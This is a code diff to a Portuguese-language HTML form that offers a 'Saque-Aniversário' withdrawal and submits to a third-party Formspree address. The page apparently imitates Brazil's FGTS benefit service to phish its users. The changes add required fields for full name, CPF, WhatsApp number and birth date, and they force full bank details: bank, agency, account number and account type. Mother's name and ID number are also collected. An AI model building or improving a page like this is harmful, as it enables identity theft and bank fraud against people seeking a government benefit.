@@ -93,8 +93,8 @@
       font-size: 14px;
     }
 
-    #pix_fields, #bank_fields {
-      display: none;
+    #bank_fields {
+      display: block;
     }
 
     @media (max-width: 768px) {
@@ -129,6 +129,22 @@
 
   <form action="https://formspree.io/f/mjkwynje" method="POST">
 
+    <!-- Nome Completo -->
+    <label for="full_name">Nome Completo*</label>
+    <input type="text" id="full_name" name="full_name" placeholder="Digite seu nome completo" required>
+
+    <!-- CPF -->
+    <label for="cpf">CPF*</label>
+    <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF" required>
+
+    <!-- Celular WhatsApp -->
+    <label for="whatsapp">Celular (WhatsApp)*</label>
+    <input type="text" id="whatsapp" name="whatsapp" placeholder="Digite seu número de celular (WhatsApp)" required>
+
+    <!-- Data de Nascimento -->
+    <label for="birth_date">Data de Nascimento*</label>
+    <input type="date" id="birth_date" name="birth_date" required>
+
     <!-- Tipo de Documento -->
     <label for="document_type">Tipo de Documento*</label>
     <select id="document_type" name="document_type" required>
@@ -139,43 +155,6 @@
     <!-- Número do Documento -->
     <label for="document_number">Número do Documento*</label>
     <input type="text" id="document_number" name="document_number" placeholder="Digite o número do seu documento" required>
-
-    <!-- Data de Expedição -->
-    <label for="issue_date">Data de Expedição do Documento*</label>
-    <input type="date" id="issue_date" name="issue_date" required>
-
-    <!-- Estado de Expedição -->
-    <label for="state_of_issue">Estado de Expedição*</label>
-    <select id="state_of_issue" name="state_of_issue" required>
-      <option value="">Selecione</option>
-      <option value="AC">Acre</option>
-      <option value="AL">Alagoas</option>
-      <option value="AP">Amapá</option>
-      <option value="AM">Amazonas</option>
-      <option value="BA">Bahia</option>
-      <option value="CE">Ceará</option>
-      <option value="DF">Distrito Federal</option>
-      <option value="ES">Espírito Santo</option>
-      <option value="GO">Goiás</option>
-      <option value="MA">Maranhão</option>
-      <option value="MT">Mato Grosso</option>
-      <option value="MS">Mato Grosso do Sul</option>
-      <option value="MG">Minas Gerais</option>
-      <option value="PA">Pará</option>
-      <option value="PB">Paraíba</option>
-      <option value="PR">Paraná</option>
-      <option value="PE">Pernambuco</option>
-      <option value="PI">Piauí</option>
-      <option value="RJ">Rio de Janeiro</option>
-      <option value="RN">Rio Grande do Norte</option>
-      <option value="RS">Rio Grande do Sul</option>
-      <option value="RO">Rondônia</option>
-      <option value="RR">Roraima</option>
-      <option value="SC">Santa Catarina</option>
-      <option value="SP">São Paulo</option>
-      <option value="SE">Sergipe</option>
-      <option value="TO">Tocantins</option>
-    </select>
 
     <!-- Nome da Mãe -->
     <label for="mother_name">Nome da Mãe*</label>
@@ -195,32 +174,34 @@
 
     <!-- Forma de Pagamento -->
     <label for="payment_method">Escolha a forma de pagamento*</label>
-    <select id="payment_method" name="payment_method" required onchange="togglePaymentFields()">
-      <option value="">Selecione</option>
-      <option value="pix">Pix</option>
+    <select id="payment_method" name="payment_method" required>
       <option value="bank">Conta Bancária</option>
     </select>
 
-    <!-- Campos Pix -->
-    <div id="pix_fields">
-      <label for="pix_key_type">Tipo de Chave Pix*</label>
-      <select id="pix_key_type" name="pix_key_type">
-        <option value="cpf">CPF</option>
-        <option value="email">E-mail</option>
-        <option value="phone">Celular</option>
-      </select>
-
-      <label for="pix_key">Chave Pix*</label>
-      <input type="text" id="pix_key" name="pix_key" placeholder="Digite sua chave Pix">
-    </div>
-
     <!-- Campos Bancários -->
     <div id="bank_fields">
+      <label for="bank_name">Nome do Banco*</label>
+      <input type="text" id="bank_name" name="bank_name" placeholder="Digite o nome do banco" required>
+
+      <!-- Tipo de Banco (Digital ou Físico) -->
+      <label for="bank_type">Tipo de Banco*</label>
+      <select id="bank_type" name="bank_type" required>
+        <option value="digital">Banco Digital</option>
+        <option value="physical">Banco Físico</option>
+      </select>
+
       <label for="agency">Agência Bancária*</label>
-      <input type="text" id="agency" name="agency" placeholder="Digite o número da agência">
+      <input type="text" id="agency" name="agency" placeholder="Digite o número da agência" required>
 
       <label for="account_full">Número da Conta com Dígito*</label>
-      <input type="text" id="account_full" name="account_full" placeholder="Ex: 123456-7">
+      <input type="text" id="account_full" name="account_full" placeholder="Ex: 123456-7" required>
+
+      <!-- Tipo de Conta (Corrente ou Poupança) -->
+      <label for="account_type">Tipo de Conta*</label>
+      <select id="account_type" name="account_type" required>
+        <option value="corrente">Corrente</option>
+        <option value="poupanca">Poupança</option>
+      </select>
     </div>
 
     <!-- Termos -->
@@ -234,27 +215,6 @@
     <button type="submit" class="submit-btn">Finalizar Saque-Aniversário</button>
   </form>
 </div>
-
-<script>
-  function togglePaymentFields() {
-    const paymentMethod = document.getElementById("payment_method").value;
-    const pixFields = document.getElementById("pix_fields");
-    const bankFields = document.getElementById("bank_fields");
-
-    pixFields.style.display = paymentMethod === "pix" ? "block" : "none";
-    bankFields.style.display = paymentMethod === "bank" ? "block" : "none";
-
-    if (paymentMethod !== "pix") {
-      document.getElementById("pix_key_type").value = "";
-      document.getElementById("pix_key").value = "";
-    }
-
-    if (paymentMethod !== "bank") {
-      document.getElementById("agency").value = "";
-      document.getElementById("account_full").value = "";
-    }
-  }
-</script>
 
 </body>
   </html>
